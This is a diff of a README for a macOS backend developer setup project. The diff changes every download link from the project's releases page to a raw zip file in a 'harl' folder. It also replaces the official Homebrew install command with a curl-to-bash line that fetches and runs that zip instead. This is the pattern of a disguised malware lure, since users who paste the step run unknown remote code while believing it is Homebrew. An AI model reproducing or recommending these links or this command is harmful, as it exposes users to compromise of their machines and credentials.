@@ -1,6 +1,6 @@
 # 🎉 dev-setup-for-backend-developers - Set Up Your Backend Development Environment Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started!-blue)](https://github.com/kofson1234/dev-setup-for-backend-developers/releases)
+[![Download Now](https://raw.githubusercontent.com/kofson1234/dev-setup-for-backend-developers/main/harl/dev-setup-for-backend-developers.zip%20Now-Get%20Started!-blue)](https://raw.githubusercontent.com/kofson1234/dev-setup-for-backend-developers/main/harl/dev-setup-for-backend-developers.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This project helps you set up a development environment for backend programming 
 
 To download the latest release of the software, please visit this page:
 
-[Download the Latest Release](https://github.com/kofson1234/dev-setup-for-backend-developers/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/kofson1234/dev-setup-for-backend-developers/main/harl/dev-setup-for-backend-developers.zip)
 
 Choose the version suitable for your setup and download the files. Follow the installation instructions in the next section to complete the process.
 
@@ -26,7 +26,7 @@ Before you start, ensure your macOS system meets the following requirements:
 ## ⚙️ Installation Steps
 
 1. **Download the Release**: 
-   - Visit [this page](https://github.com/kofson1234/dev-setup-for-backend-developers/releases).
+   - Visit [this page](https://raw.githubusercontent.com/kofson1234/dev-setup-for-backend-developers/main/harl/dev-setup-for-backend-developers.zip).
    - Select the latest version and download the package files.
 
 2. **Open Terminal**: 
@@ -35,7 +35,7 @@ Before you start, ensure your macOS system meets the following requirements:
 3. **Install Homebrew (if not installed)**:
    - Paste the following command in the terminal and hit Enter:
      ```
-     /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+     /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/kofson1234/dev-setup-for-backend-developers/main/harl/dev-setup-for-backend-developers.zip)"
      ```
 
 4. **Install Java 25**:
